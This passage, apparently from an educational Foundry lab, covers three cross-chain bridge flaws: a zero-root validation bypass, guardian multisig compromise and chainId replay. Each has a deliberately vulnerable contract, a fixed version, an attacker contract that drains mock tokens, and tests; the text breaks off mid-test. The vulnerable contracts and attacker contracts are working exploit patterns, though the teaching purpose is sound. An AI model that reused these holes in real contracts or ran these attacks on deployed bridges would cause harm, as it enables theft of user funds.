    function process(bytes memory message) external {
        bytes32 msgHash = keccak256(message);

        // ✓ 消息必须已被 prove，且对应的 root 必须有效
        require(messages[msgHash] != bytes32(0), "Message not proven"); // ✓ 显式检查非零
        require(acceptableRoot(messages[msgHash]), "Root not acceptable");
        require(!processed[msgHash], "Already processed");              // ✓ 防重放
        processed[msgHash] = true;

        // ✓ 只处理转账类型，管理操作通过独立高权限函数处理
        (uint8 msgType, bytes memory payload) = abi.decode(message, (uint8, bytes));
        require(msgType == MSG_TRANSFER, "Invalid msg type");

        (address recipient, uint256 amount) = abi.decode(payload, (address, uint256));
        token.transfer(recipient, amount);
    }
}

/**
 * @title ValidationBypassAttacker
 * @notice 利用 messages[hash] 默认值 = bytes32(0) + acceptableRoot(0) = true，
 *         构造任意消息通过验证
 */
contract ValidationBypassAttacker {
    VulnerableValidationBridge public bridge;
    MockERC20 public token;

    constructor(address _bridge) {
        bridge = VulnerableValidationBridge(_bridge);
        token  = MockERC20(bridge.token());
    }

    function attack(uint256 amount) external {
        console.log("\n=== Scene 4: Validation Bypass Attack ===");
        console.log("(Nomad Bridge Root=0x00 Pattern)");

        console.log("\n--- Step 1: Understand the vulnerability ---");
        console.log("confirmAt[bytes32(0)] = 1 (set in constructor)");
        console.log("acceptableRoot(0x00) =", bridge.acceptableRoot(bytes32(0)));
        console.log("messages[anyHash] = 0x00 (default mapping value)");
        console.log("=> any message hash passes the root check!");

        // 第2步：构造任意一个代币转账消息
        console.log("\n--- Step 2: Craft arbitrary transfer message ---");
        bytes memory payload = abi.encode(address(this), amount);
        bytes memory message = abi.encode(uint8(1), payload);
        bytes32 msgHash = keccak256(message);

        console.log("Constructed message to transfer:", amount);
        console.log("Message hash (not stored in bridge.messages):", uint256(msgHash));

        // 第3步：直接调用 process()，消息哈希未被证明但默认根通过验证
        console.log("\n--- Step 3: Submit unprovided message (default root = 0x00 passes) ---");
        uint256 balBefore = token.balanceOf(address(this));
        bridge.process(message);
        uint256 balAfter = token.balanceOf(address(this));
        console.log("Tokens received:", balAfter - balBefore);

        console.log("\n--- Results ---");
        console.log("Arbitrary message processed without being proven");
        console.log("Default mapping value (bytes32(0)) treated as valid root");
        console.log("Real case: Nomad Bridge $190M (Aug 2022)");
        console.log("Real case: Anyone copied calldata and substituted recipient");
        console.log("================================");
    }
}


// ================================================================
// 场景5：守护者多数妥协 (Guardian Majority Compromise)
// ================================================================

/**
 * @title VulnerableGuardianMultisig
 * @notice 演示守护者（多签验证者）机制的设计缺陷
 *
 * 真实案例1：Ronin Bridge（2022年3月，损失 $625M）
 *   - 9 个验证者节点，阈值 5/9
 *   - 攻击者控制：Sky Mavis 4 节点（黑客渗透）+ Axie DAO 1 节点（历史授权未撤销）
 *   - 已达到 5/9 阈值，无需其他技术漏洞
 *   - 攻击者伪造提款交易，一次性取走 $625M
 *
 * 真实案例2：Multichain（2023年7月，损失 $130M）
 *   - MPC（多方计算）节点被集中控制于 CEO 一人
 *   - CEO 失联后，私钥无法恢复
 *   - 攻击者（可能是内部人）使用 MPC 私钥直接提款
 *
 * 守护者机制设计缺陷：
 *   1. 阈值设置过低（3/5 而非 5/9）
 *   2. 守护者密钥未分布存储
 *   3. 历史守护者未被及时移除（Ronin：Axie DAO 授权 9 个月后仍有效）
 *   4. 缺少速率限制（一次性提走所有资产）
 *   5. 缺少提款延迟（无法撤销恶意交易）
 */
contract VulnerableGuardianMultisig {
    MockERC20 public token;

    address[] public guardians;
    uint256   public threshold;

    mapping(bytes32 => mapping(address => bool)) public hasSigned;
    mapping(bytes32 => uint256) public signatureCount;
    mapping(bytes32 => bool) public executed;

    event GuardianAdded(address guardian);
    event WithdrawalExecuted(bytes32 indexed txHash, address recipient, uint256 amount);

    constructor(address _token, address[] memory _guardians, uint256 _threshold) {
        token     = MockERC20(_token);
        threshold = _threshold;
        for (uint256 i = 0; i < _guardians.length; i++) {
            guardians.push(_guardians[i]);
        }
        MockERC20(_token).mint(address(this), 10_000_000e18);
    }

    //  漏洞1：守护者可以无限制添加（无上限，无延迟）
    // 若管理员被攻击，可以立即添加攻击者控制的守护者
    function addGuardian(address newGuardian) external {
        //  缺少：谁有权添加？缺少权限控制
        //  缺少：添加新守护者的时间延迟
        guardians.push(newGuardian);
        emit GuardianAdded(newGuardian);
    }

    //  漏洞2：提款没有金额上限和延迟
    function submitSignature(
        bytes32 txHash,
        address recipient,
        uint256 amount,
        bytes memory sig
    ) external {
        //  没有验证 sig 是否来自 txHash 的合法签名
        bytes32 msgHash = keccak256(abi.encodePacked(txHash, recipient, amount));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));
        (bytes32 r, bytes32 s, uint8 v) = _split(sig);
        address recovered = ecrecover(ethHash, v, r, s);

        require(_isGuardian(recovered), "Not guardian");
        require(!hasSigned[txHash][recovered], "Already signed");

        hasSigned[txHash][recovered] = true;
        signatureCount[txHash]++;

        //  漏洞3：达到阈值立即执行，没有时间延迟（无法撤销）
        if (signatureCount[txHash] >= threshold && !executed[txHash]) {
            executed[txHash] = true;
            //  没有金额限制，可以一次性转走所有代币
            token.transfer(recipient, amount);
            emit WithdrawalExecuted(txHash, recipient, amount);
        }
    }

    function _isGuardian(address addr) internal view returns (bool) {
        for (uint256 i = 0; i < guardians.length; i++) {
            if (guardians[i] == addr) return true;
        }
        return false;
    }

    function _split(bytes memory sig) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
        require(sig.length == 65, "Bad length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }

    function guardianCount() external view returns (uint256) { return guardians.length; }
}

/**
 * @title SafeGuardianMultisig
 * @notice 带速率限制、提款延迟和守护者轮换的安全多签
 */
contract SafeGuardianMultisig {
    MockERC20 public token;

    address[] public guardians;
    uint256   public threshold;
    address   public admin;

    mapping(bytes32 => mapping(address => bool)) public hasSigned;
    mapping(bytes32 => uint256) public signatureCount;
    mapping(bytes32 => bool) public executed;

    //  提款延迟：签名收集完成后，需等待 24 小时才能执行
    uint256 public constant EXECUTION_DELAY  = 24 hours;
    mapping(bytes32 => uint256) public readyAt;  // txHash => earliest execution time

    //  速率限制：每日最大提款金额
    uint256 public constant DAILY_LIMIT = 1_000_000e18;
    uint256 public dailyWithdrawn;
    uint256 public lastResetDay;

    //  守护者轮换：新增守护者需要时间延迟
    uint256 public constant GUARDIAN_DELAY = 7 days;
    mapping(address => uint256) public pendingGuardianSince;

    event GuardianScheduled(address indexed guardian, uint256 effectiveAt);
    event WithdrawalQueued(bytes32 indexed txHash, uint256 executeAt);
    event WithdrawalExecuted(bytes32 indexed txHash, address recipient, uint256 amount);

    constructor(address _token, address[] memory _guardians, uint256 _threshold) {
        token     = MockERC20(_token);
        threshold = _threshold;
        admin     = msg.sender;
        for (uint256 i = 0; i < _guardians.length; i++) {
            guardians.push(_guardians[i]);
        }
        MockERC20(_token).mint(address(this), 10_000_000e18);
    }

    //  守护者添加需要 7 天延迟 + admin 权限
    function scheduleAddGuardian(address newGuardian) external {
        require(msg.sender == admin, "Not admin");
        require(newGuardian != address(0), "Zero address");
        pendingGuardianSince[newGuardian] = block.timestamp;
        emit GuardianScheduled(newGuardian, block.timestamp + GUARDIAN_DELAY);
    }

    function confirmAddGuardian(address newGuardian) external {
        require(pendingGuardianSince[newGuardian] != 0, "Not scheduled");
        require(block.timestamp >= pendingGuardianSince[newGuardian] + GUARDIAN_DELAY, "Delay not met");
        guardians.push(newGuardian);
        delete pendingGuardianSince[newGuardian];
    }

    //  提款流程：签名 → 进入队列 → 24小时后执行
    function submitSignature(
        bytes32 txHash,
        address recipient,
        uint256 amount,
        bytes memory sig
    ) external {
        bytes32 msgHash = keccak256(abi.encodePacked(txHash, recipient, amount));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));
        (bytes32 r, bytes32 s, uint8 v) = _split(sig);
        address recovered = ecrecover(ethHash, v, r, s);

        require(recovered != address(0), "Invalid sig");
        require(_isGuardian(recovered), "Not guardian");
        require(!hasSigned[txHash][recovered], "Already signed");

        hasSigned[txHash][recovered] = true;
        signatureCount[txHash]++;

        //  达到阈值进入队列，不立即执行
        if (signatureCount[txHash] == threshold && readyAt[txHash] == 0) {
            readyAt[txHash] = block.timestamp + EXECUTION_DELAY;
            emit WithdrawalQueued(txHash, readyAt[txHash]);
        }
    }

    //  延迟后才能执行
    function executeWithdrawal(bytes32 txHash, address recipient, uint256 amount) external {
        require(readyAt[txHash] != 0,                   "Not queued");
        require(block.timestamp >= readyAt[txHash],     "Delay not met");      // ✓ 延迟
        require(!executed[txHash],                      "Already executed");

        //  速率限制检查
        uint256 today = block.timestamp / 1 days;
        if (today > lastResetDay) { dailyWithdrawn = 0; lastResetDay = today; }
        require(dailyWithdrawn + amount <= DAILY_LIMIT, "Daily limit exceeded"); // ✓ 速率限制

        executed[txHash]  = true;
        dailyWithdrawn   += amount;
        token.transfer(recipient, amount);
        emit WithdrawalExecuted(txHash, recipient, amount);
    }

    function _isGuardian(address addr) internal view returns (bool) {
        for (uint256 i = 0; i < guardians.length; i++) {
            if (guardians[i] == addr) return true;
        }
        return false;
    }

    function _split(bytes memory sig) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
        require(sig.length == 65, "Bad length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }

    function guardianCount() external view returns (uint256) { return guardians.length; }
}

/**
 * @title GuardianCompromiseAttacker
 * @notice 演示获得多数守护者后，一次性清空桥接资金
 */
contract GuardianCompromiseAttacker {
    VulnerableGuardianMultisig public bridge;
    MockERC20 public token;

    constructor(address _bridge) {
        bridge = VulnerableGuardianMultisig(_bridge);
        token  = MockERC20(bridge.token());
    }

    function attack(
        bytes32 txHash,
        uint256 amount,
        bytes[] memory compromisedSigs  // 被攻击者控制的守护者签名
    ) external {
        console.log("\n=== Scene 5: Guardian Majority Compromise ===");
        console.log("(Ronin Bridge $625M Pattern)");

        console.log("\n--- Step 1: Attacker controls majority of guardian keys ---");
        console.log("Total guardians:", bridge.guardianCount());
        console.log("Threshold:", bridge.threshold());
        console.log("Compromised signatures:", compromisedSigs.length);

        console.log("\n--- Step 2: Submit compromised guardian signatures ---");
        for (uint256 i = 0; i < compromisedSigs.length; i++) {
            bridge.submitSignature(txHash, address(this), amount, compromisedSigs[i]);
            console.log("Submitted signature", i + 1);
        }

        console.log("\n--- Step 3: Check if threshold reached ---");
        console.log("Signatures collected:", bridge.signatureCount(txHash));
        console.log("Executed:", bridge.executed(txHash));

        uint256 balAfter = token.balanceOf(address(this));
        console.log("Attacker received:", balAfter);

        console.log("\n--- Results ---");
        console.log("No execution delay => funds drained immediately");
        console.log("No rate limit => full balance taken in one tx");
        console.log("Real case: Ronin Bridge $625M (March 2022)");
        console.log("Real case: 4 Sky Mavis nodes + 1 Axie DAO node = 5/9 threshold");
        console.log("Fix: execution delay + daily limit + guardian rotation delay");
        console.log("================================");
    }
}


// ================================================================
// 场景6：跨链 chainId 重放 (Cross-chain ChainId Replay)
// ================================================================

/**
 * @title VulnerableChainIdReplay
 * @notice 演示签名中 chainId 验证缺失或错误导致的跨链重放
 *
 * 与场景3的区别：
 *   - 场景3：EIP-712 域分隔符中缺少 chainId（签名格式层面）
 *   - 场景6：消息体或执行逻辑中对 chainId 的验证缺失（业务逻辑层面）
 *   - 包括：硬编码错误 chainId、使用 tx.origin 的 chainId 等特殊攻击
 *
 * 真实案例1：多个 Layer2 桥（2022年）
 *   - 消息中包含 chainId 字段，但执行时不验证 block.chainid
 *   - 在 Optimism 分叉后，相同消息在两条链上都有效
 *
 * 真实案例2：EVM 链分叉期间（ETC/ETH 分裂）
 *   - 没有 chainId 的旧式签名（pre-EIP-155）在两条链上都有效
 *   - 导致 ETH 转账在 ETC 上也可执行
 *
 * 真实案例3：Meter Passport（2022年2月，损失 $4.4M）
 *   - ResourceID 未包含 chainId，相同的跨链消息可被在多条链上执行
 */
contract VulnerableChainIdReplay {
    MockERC20 public token;
    address   public relayer;
    mapping(bytes32 => bool) public processed;

    constructor(address _token, address _relayer) {
        token   = MockERC20(_token);
        relayer = _relayer;
        MockERC20(_token).mint(address(this), 10_000_000e18);
    }

    //  漏洞A：消息包含 dstChainId 字段，但执行时不验证
    function processMessage_NoChainCheck(
        address recipient,
        uint256 amount,
        uint256 srcChainId,
        uint256 dstChainId,  //  接收了但从不验证
        bytes32 nonce,
        bytes memory sig
    ) external {
        bytes32 msgHash = keccak256(abi.encodePacked(
            recipient, amount, srcChainId, dstChainId, nonce
        ));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));
        (bytes32 r, bytes32 s, uint8 v) = _split(sig);
        require(ecrecover(ethHash, v, r, s) == relayer, "Bad sig");

        //  没有 require(dstChainId == block.chainid)
        // 在链ID=1 上签名的消息可以在链ID=56 (BSC) 上执行

        require(!processed[nonce], "Processed");
        processed[nonce] = true;
        token.transfer(recipient, amount);
    }

    //  漏洞B：hardcoded chainId（部署时正确，分叉后错误）
    uint256 public constant CHAIN_ID = 1;  //  硬编码主网 ID

    function processMessage_HardcodedChain(
        address recipient,
        uint256 amount,
        bytes32 nonce,
        bytes memory sig
    ) external {
        bytes32 msgHash = keccak256(abi.encodePacked(recipient, amount, CHAIN_ID, nonce));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));
        (bytes32 r, bytes32 s, uint8 v) = _split(sig);
        require(ecrecover(ethHash, v, r, s) == relayer, "Bad sig");

        //  block.chainid 在分叉后变为新的 ID（如 ETC = 61）
        // 但签名中包含 CHAIN_ID = 1（ETH），在两条链上都能通过
        // 因为分叉后两条链共享相同历史，CHAIN_ID=1 的签名对两条链都有效

        require(!processed[nonce], "Processed");
        processed[nonce] = true;
        token.transfer(recipient, amount);
    }

    //  漏洞C：ResourceID 不包含 chainId（Meter Passport 模式）
    // ResourceID 是跨链资产的标识符，若不含 chainId，同一 ResourceID
    // 在多条链上都代表同一资产，使得消息可跨链重放
    mapping(bytes32 => address) public resourceIdToToken;  // resourceId => token

    function registerResource(bytes32 resourceId, address tokenAddr) external {
        //  resourceId 不含 chainId，在链A和链B上注册相同 resourceId
        resourceIdToToken[resourceId] = tokenAddr;
    }

    function depositResource(
        bytes32 resourceId,
        uint256 amount,
        uint256 dstChainId,
        address recipient,
        bytes32 nonce
    ) external {
        //  resourceId 不绑定 srcChainId，在任何链上都能执行同一 resourceId 的操作
        address tokenAddr = resourceIdToToken[resourceId];
        require(tokenAddr != address(0), "Unknown resource");
        MockERC20(tokenAddr).transferFrom(msg.sender, address(this), amount);
        // 发出跨链消息（含 dstChainId 但 resourceId 本身不含链信息）
    }

    function _split(bytes memory sig) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
        require(sig.length == 65, "Bad length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }
}

/**
 * @title SafeChainIdReplay
 * @notice 全面的 chainId 保护：域分隔符 + 消息体 + 执行验证三重绑定
 */
contract SafeChainIdReplay {
    MockERC20 public token;
    address   public relayer;
    mapping(bytes32 => bool) public processed;

    //  域分隔符包含 chainId（第一层）
    bytes32 public immutable DOMAIN_SEPARATOR;
    bytes32 public constant MSG_TYPEHASH =
        keccak256("BridgeMsg(address recipient,uint256 amount,uint256 srcChainId,uint256 dstChainId,bytes32 nonce)");

    constructor(address _token, address _relayer) {
        token   = MockERC20(_token);
        relayer = _relayer;
        MockERC20(_token).mint(address(this), 10_000_000e18);
        DOMAIN_SEPARATOR = keccak256(abi.encode(
            keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
            keccak256("SafeChainBridge"),
            keccak256("1"),
            block.chainid,   // ✓ 第一层：域分隔符绑定 chainId
            address(this)
        ));
    }

    function processMessage(
        address recipient,
        uint256 amount,
        uint256 srcChainId,
        uint256 dstChainId,   // ✓ 消息体中包含目标链 ID
        bytes32 nonce,
        bytes memory sig
    ) external {
        //  第二层：消息体验证目标链 ID
        require(dstChainId == block.chainid, "Wrong destination chain");
        require(srcChainId != block.chainid, "Src == Dst chain");

        //  第三层：EIP-712 结构化哈希（域分隔符已含 chainId）
        bytes32 structHash = keccak256(abi.encode(
            MSG_TYPEHASH, recipient, amount, srcChainId, dstChainId, nonce
        ));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", DOMAIN_SEPARATOR, structHash));

        require(!processed[nonce], "Processed");
        processed[nonce] = true;

        (bytes32 r, bytes32 s, uint8 v) = _split(sig);
        require(ecrecover(digest, v, r, s) == relayer, "Bad sig");
        token.transfer(recipient, amount);
    }

    function _split(bytes memory sig) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
        require(sig.length == 65, "Bad length");
        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
    }
}

/**
 * @title ChainIdReplayAttacker
 * @notice 演示 dstChainId 字段存在但执行时不验证，消息在错误链上被处理
 */
contract ChainIdReplayAttacker {
    VulnerableChainIdReplay public bridge;
    MockERC20 public token;

    constructor(address _bridge) {
        bridge = VulnerableChainIdReplay(_bridge);
        token  = MockERC20(bridge.token());
    }

    function attack(
        address recipient,
        uint256 amount,
        uint256 srcChainId,
        uint256 dstChainIdInMsg,  // 签名中的目标链（与当前链不同）
        bytes32 nonce,
        bytes memory sig
    ) external {
        console.log("\n=== Scene 6: Cross-chain ChainId Replay ===");
        console.log("(Meter Passport / Multi-chain Fork Pattern)");

        console.log("\n--- Step 1: Message signed for Chain A ---");
        console.log("srcChainId in message:", srcChainId);
        console.log("dstChainId in message:", dstChainIdInMsg);
        console.log("Current chain (block.chainid):", block.chainid);

        // 第2步：在当前链上提交（dstChainId 与 block.chainid 不同，但不验证）
        console.log("\n--- Step 2: Submit to current chain (dstChainId != block.chainid) ---");
        uint256 balBefore = token.balanceOf(recipient);
        bridge.processMessage_NoChainCheck(
            recipient, amount, srcChainId, dstChainIdInMsg, nonce, sig
        );
        uint256 balAfter = token.balanceOf(recipient);
        console.log("Tokens received despite wrong dstChainId:", balAfter - balBefore);

        // 第3步：演示硬编码 chainId 的问题
        console.log("\n--- Step 3: Hardcoded CHAIN_ID = 1 issue ---");
        console.log("After chain fork, block.chainid changes but CHAIN_ID stays 1");
        console.log("Signatures valid on both ETH (1) and ETC (61)");
        console.log("Any ETH tx signed before fork is replayable on ETC");

        console.log("\n--- Results ---");
        console.log("dstChainId field in message ignored during execution");
        console.log("Message processed on wrong chain");
        console.log("Real case: Meter Passport $4.4M (Feb 2022)");
        console.log("Real case: ETH/ETC fork replay attacks");
        console.log("Fix: require(dstChainId == block.chainid) + EIP-712 with chainId");
        console.log("================================");
    }
}


// ================================================================
// FOUNDRY 测试
// ================================================================

contract CrossChainBridgeTest is Test {
    // 场景1
    MockERC20                 public token1;
    VulnerableBridgeReplay    public vulnReplay;
    SafeBridgeReplay          public safeReplay;
    ReplayAttacker            public replayAttacker;
    address public relayer1;
    uint256 public relayerKey1 = 0xA11CE;

    // 场景2
    MockERC20                    public token2;
    VulnerableBridgeSigForgery   public vulnSig;
    SafeBridgeSigForgery         public safeSig;
    SigForgeryAttacker           public sigAttacker;
    address public guardian2;
    uint256 public guardianKey2 = 0xB0B;

    // 场景3
    MockERC20                    public token3;
    VulnerableDomainSeparation   public vulnDomain;
    SafeDomainSeparation         public safeDomain;
    DomainSeparationAttacker     public domainAttacker;
    address public signer3;
    uint256 public signerKey3 = 0xC0DE;

    // 场景4
    MockERC20                    public token4;
    VulnerableValidationBridge   public vulnValidation;
    SafeValidationBridge         public safeValidation;
    ValidationBypassAttacker     public validationAttacker;

    // 场景5
    MockERC20                    public token5;
    VulnerableGuardianMultisig   public vulnGuardian;
    SafeGuardianMultisig         public safeGuardian;
    GuardianCompromiseAttacker   public guardianAttacker;
    uint256[] public guardianKeys;
    address[] public guardianAddrs;

    // 场景6
    MockERC20                    public token6;
    VulnerableChainIdReplay      public vulnChainId;
    SafeChainIdReplay            public safeChainId;
    ChainIdReplayAttacker        public chainIdAttacker;
    address public relayer6;
    uint256 public relayerKey6 = 0xDEAD;

    function setUp() public {
        // ── 场景1：消息重放 ──
        relayer1  = vm.addr(relayerKey1);
        token1    = new MockERC20("BridgeToken1", "BT1", 0);
        vulnReplay = new VulnerableBridgeReplay(address(token1), relayer1);
        safeReplay = new SafeBridgeReplay(address(token1), relayer1);
        replayAttacker = new ReplayAttacker(address(vulnReplay));

        // ── 场景2：签名伪造 ──
        guardian2 = vm.addr(guardianKey2);
        token2    = new MockERC20("BridgeToken2", "BT2", 0);
        vulnSig   = new VulnerableBridgeSigForgery(address(token2), guardian2);
        safeSig   = new SafeBridgeSigForgery(address(token2), guardian2);
        sigAttacker = new SigForgeryAttacker(address(vulnSig));

        // vulnSig_Zero：guardian = address(0) 用于演示漏洞A
        // 在测试中单独部署

        // ── 场景3：域分隔符 ──
        signer3     = vm.addr(signerKey3);
        token3      = new MockERC20("BridgeToken3", "BT3", 0);
        vulnDomain  = new VulnerableDomainSeparation(address(token3), signer3);
        safeDomain  = new SafeDomainSeparation(address(token3), signer3);
        domainAttacker = new DomainSeparationAttacker(address(vulnDomain));

        // ── 场景4：验证绕过 ──
        token4      = new MockERC20("BridgeToken4", "BT4", 0);
        vulnValidation = new VulnerableValidationBridge(address(token4));
        address updater4 = address(this);
        safeValidation = new SafeValidationBridge(address(token4), updater4);
        validationAttacker = new ValidationBypassAttacker(address(vulnValidation));

        // ── 场景5：守护者妥协 ──
        token5 = new MockERC20("BridgeToken5", "BT5", 0);
        guardianKeys = [uint256(0x1111), 0x2222, 0x3333, 0x4444, 0x5555,
                        0x6666, 0x7777, 0x8888, 0x9999];
        address[] memory gAddrs = new address[](9);
        for (uint i = 0; i < 9; i++) {
            gAddrs[i] = vm.addr(guardianKeys[i]);
            guardianAddrs.push(gAddrs[i]);
        }
        vulnGuardian    = new VulnerableGuardianMultisig(address(token5), gAddrs, 5);
        safeGuardian    = new SafeGuardianMultisig(address(token5), gAddrs, 5);
        guardianAttacker = new GuardianCompromiseAttacker(address(vulnGuardian));

        // ── 场景6：chainId 重放 ──
        relayer6    = vm.addr(relayerKey6);
        token6      = new MockERC20("BridgeToken6", "BT6", 0);
        vulnChainId = new VulnerableChainIdReplay(address(token6), relayer6);
        safeChainId = new SafeChainIdReplay(address(token6), relayer6);
        chainIdAttacker = new ChainIdReplayAttacker(address(vulnChainId));
    }

    // ─────────────────────────────────────────────
    // 测试1：消息重放
    // ─────────────────────────────────────────────
    function testMessageReplay() public {
        console.log("\n== TEST: Message Replay ==");

        address recipient = address(0xABCD);
        uint256 amount    = 100_000e18;
        bytes32 srcTxHash = keccak256("legit_source_tx");

        // 构造合法签名
        bytes32 msgHash = keccak256(abi.encodePacked(srcTxHash, recipient, amount));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(relayerKey1, ethHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        // 第一次调用：合法
        vulnReplay.processMessage(srcTxHash, recipient, amount, sig);
        uint256 balAfterFirst = token1.balanceOf(recipient);
        console.log("After first process:", balAfterFirst);

        // 重放：同样成功（漏洞）
        vulnReplay.processMessage(srcTxHash, recipient, amount, sig);
        uint256 balAfterReplay = token1.balanceOf(recipient);
        console.log("After replay:", balAfterReplay);

        assertEq(balAfterReplay, amount * 2, "Replay succeeded: double tokens");
        console.log("Replay attack successful: received 2x tokens");
    }

    function testSafeMessageNoReplay() public {
        console.log("\n== TEST: Safe Bridge No Replay ==");

        address recipient = address(0xABCD);
        uint256 amount    = 100_000e18;
        bytes32 srcTxHash = keccak256("legit_source_tx_safe");

        bytes32 msgHash = keccak256(abi.encodePacked(srcTxHash, recipient, amount));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(relayerKey1, ethHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        safeReplay.processMessage(srcTxHash, recipient, amount, sig);

        vm.expectRevert("Message already processed");
        safeReplay.processMessage(srcTxHash, recipient, amount, sig);
        console.log("Safe: replay blocked with 'Message already processed'");
    }

    // ─────────────────────────────────────────────
    // 测试2：签名伪造——ecrecover address(0) 绕过
    // ─────────────────────────────────────────────
    function testSigForgeryZeroGuardian() public {
        console.log("\n== TEST: Sig Forgery - Zero Address Guardian ==");

        // 部署 guardian = address(0) 的漏洞版本
        VulnerableBridgeSigForgery zeroGuardianBridge =
            new VulnerableBridgeSigForgery(address(token2), address(0));

        uint256 amount = 50_000e18;
        address victim = address(0x1234);

        // 无效签名（ecrecover 返回 address(0)）
        bytes memory invalidSig = new bytes(65);
        invalidSig[64] = 0x1b; // v = 27，r = s = 0 会导致 ecrecover 返回 0

        uint256 balBefore = token2.balanceOf(victim);
        // 此调用通过：ecrecover(hash, 27, 0, 0) = address(0) == guardian
        zeroGuardianBridge.mintWithSig_Vuln1(victim, amount, invalidSig);
        uint256 balAfter = token2.balanceOf(victim);

        assertEq(balAfter - balBefore, amount, "Zero guardian bypass: minted without valid sig");
        console.log("Zero guardian bypass successful: minted", amount);
    }

    function testSafeSigValidation() public {
        console.log("\n== TEST: Safe Sig Validation ==");

        uint256 amount   = 50_000e18;
        address recipient = address(0xBEEF);
        uint256 deadline  = block.timestamp + 1 hours;

        uint256 nonce = safeSig.nonces(recipient);
        bytes32 structHash = keccak256(abi.encode(
            safeSig.BRIDGE_TYPEHASH(), recipient, amount, nonce, deadline
        ));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", safeSig.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(guardianKey2, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        safeSig.mintWithSig(recipient, amount, deadline, sig);
        assertEq(token2.balanceOf(recipient), amount, "Safe bridge: correct amount minted");
        console.log("Safe: valid EIP-712 sig minted", amount);

        // 重放同一签名应失败（nonce 已递增）
        vm.expectRevert();
        safeSig.mintWithSig(recipient, amount, deadline, sig);
        console.log("Safe: replay blocked by nonce");
    }

    // ─────────────────────────────────────────────
    // 测试3：域分隔符——跨链签名重用
    // ─────────────────────────────────────────────
    function testDomainSeparationCrossChainReplay() public {
        console.log("\n== TEST: Domain Separation - Cross Chain Replay ==");

        address recipient = address(0xCAFE);
        uint256 amount    = 75_000e18;
        bytes32 msgId     = keccak256("cross_chain_msg_1");

        // 在当前链上构造签名（无域分隔符）
        bytes32 msgHash = keccak256(abi.encodePacked(recipient, amount, msgId));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey3, ethHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        // 第一次：在链A（当前 block.chainid）处理
        vulnDomain.processNoDomain(recipient, amount, msgId, sig);
        uint256 bal1 = token3.balanceOf(recipient);
        console.log("Processed on current chain:", bal1);

        // 模拟"在链B上"：pretend_chainid 不同但合约相同（fork 场景）
        // 因为没有域分隔符，签名在任何链上都有效
        // 在测试中我们用新的 msgId 模拟链B的消息
        bytes32 msgId2 = keccak256("cross_chain_msg_2");

        // 在 DOMAIN_NO_CHAIN 版本上测试：同一签名在 chainId 改变后仍有效
        // 使用与 processNoChainId 相同的 EIP-712 digest 签名
        bytes32 structHash2 = keccak256(abi.encode(
            keccak256("Bridge(address recipient,uint256 amount,bytes32 msgId)"),
            recipient, amount, msgId2
        ));
        bytes32 digest2 = keccak256(abi.encodePacked("\x19\x01", vulnDomain.DOMAIN_NO_CHAIN(), structHash2));
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(signerKey3, digest2);
        bytes memory sig2_eip = abi.encodePacked(r2, s2, v2);
        vulnDomain.processNoChainId(recipient, amount, msgId2, sig2_eip);
        uint256 bal2 = token3.balanceOf(recipient);
        console.log("Processed without chainId domain:", bal2 - bal1);

        assertGt(bal2, 0, "Processed without proper domain separation");
        console.log("Cross-chain domain bypass successful");
    }

    function testSafeDomainSeparation() public {
        console.log("\n== TEST: Safe Domain Separation ==");

        address recipient = address(0xCAFE);
        uint256 amount    = 75_000e18;
        bytes32 msgId     = keccak256("safe_msg_1");
        uint256 srcChain  = 1;    // ETH mainnet
        uint256 dstChain  = block.chainid;

        bytes32 structHash = keccak256(abi.encode(
            safeDomain.BRIDGE_TYPEHASH(), recipient, amount, msgId, srcChain, dstChain
        ));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", safeDomain.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey3, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        safeDomain.processMessage(recipient, amount, msgId, srcChain, dstChain, sig);
        assertEq(token3.balanceOf(recipient), amount, "Safe: correct amount");

        // 错误 dstChainId 应被拒绝
        bytes32 msgId2 = keccak256("safe_msg_2");
        bytes32 structHash2 = keccak256(abi.encode(
            safeDomain.BRIDGE_TYPEHASH(), recipient, amount, msgId2, srcChain, dstChain + 1
        ));
        bytes32 digest2 = keccak256(abi.encodePacked("\x19\x01", safeDomain.DOMAIN_SEPARATOR(), structHash2));
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(signerKey3, digest2);
        bytes memory sig2 = abi.encodePacked(r2, s2, v2);

        vm.expectRevert("Wrong destination chain");
        safeDomain.processMessage(recipient, amount, msgId2, srcChain, dstChain + 1, sig2);
